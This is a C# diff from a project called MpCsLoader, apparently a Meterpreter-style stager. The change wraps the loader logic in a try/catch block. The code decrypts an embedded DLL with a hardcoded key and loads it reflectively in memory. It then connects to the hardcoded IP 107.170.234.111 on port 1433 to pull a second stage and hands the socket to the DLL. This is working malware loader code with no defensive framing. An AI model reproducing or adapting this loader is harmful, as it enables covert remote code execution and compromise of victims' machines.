@@ -30,18 +30,24 @@ namespace MpCsLoader
             //    throw new Exception(string.Format("Failed to load library (ErrorCode: {0})", errorCode));
             //}
 
-            byte[] oldData = MpCsLoader.Properties.Resources.mpenc;
-            byte[] dllData = Shared.Encryptor.DecryptData("intelnuc", oldData);
-
-            IntPtr mod = MemoryLibrary.MemoryLoadLibrary(dllData, new string[] { });
-            unsafe
+            try
             {
-                IntPtr init = MemoryLibrary.MemoryGetProcAddress((MemoryLibrary.MEMORYMODULE*)mod.ToPointer(), "Init");
-                MpInit func = (MpInit)Marshal.GetDelegateForFunctionPointer(init, typeof(MpInit));
-                int sockfd = StageLoader.LoadBinData("107.170.234.111",1433 );
-                func(sockfd);
-            }
+                byte[] oldData = MpCsLoader.Properties.Resources.mpenc;
+                byte[] dllData = Shared.Encryptor.DecryptData("intelnuc", oldData);
 
+                IntPtr mod = MemoryLibrary.MemoryLoadLibrary(dllData, new string[] { });
+                unsafe
+                {
+                    IntPtr init = MemoryLibrary.MemoryGetProcAddress((MemoryLibrary.MEMORYMODULE*)mod.ToPointer(), "Init");
+                    MpInit func = (MpInit)Marshal.GetDelegateForFunctionPointer(init, typeof(MpInit));
+                    int sockfd = StageLoader.LoadBinData("107.170.234.111", 1433);
+                    func(sockfd);
+                }
+            }
+            catch(Exception x)
+            {
+                Console.WriteLine(x.ToString());
+            }
 
             
 
